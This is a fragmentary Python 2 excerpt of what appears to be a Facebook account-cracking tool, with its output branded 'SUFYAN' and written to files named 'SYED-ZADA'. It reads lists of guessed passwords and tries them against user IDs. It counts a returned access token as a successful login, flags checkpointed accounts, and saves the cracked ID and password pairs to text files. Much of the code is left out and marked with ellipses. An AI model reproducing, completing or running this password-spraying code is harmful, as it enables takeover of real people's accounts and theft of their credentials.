...
def crack_select():
	...
	if select =="1":
		...
		p5 = raw_input("(*) Name + Pass : ")
		pass6 = raw_input("(*) Password : ")
		pass7 = raw_input("(*) Password : ")
		pass8 = raw_input("(*) Password : ")
		pass9 = raw_input("(*) Password : ")
		pass10 = raw_input("(*) Password : ")
											...
											cps.append(uid+pass4)
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass9+"\033[0;97m")
																ok = open("SYED-ZADAok.txt", "a")
																ok.write(uid+"|"+pass9+"\n")
																ok.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass10+"\033[0;97m")
																ok = open("SYED-ZADAok.txt", "a")
																ok.write(uid+"|"+pass10+"\n")
																ok.close()
...
def choice_select():
	...
	if select =="1":
		...
		pass8 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass9 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass10 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")		
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass8+name+"\033[0;97m")
																	cp = open("SYED-ZADAcp.txt", "a")
																	cp.write(uid+"|"+pass8+"\n")
																	cp.close()
																	cps.append(uid+pass8)
															...
															if "access_token" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass10+name+"\033[0;97m")
																	cp = open("SYED-ZADAcp.txt", "a")
																	cp.write(uid+"|"+pass10+"\n")
																	cp.close()
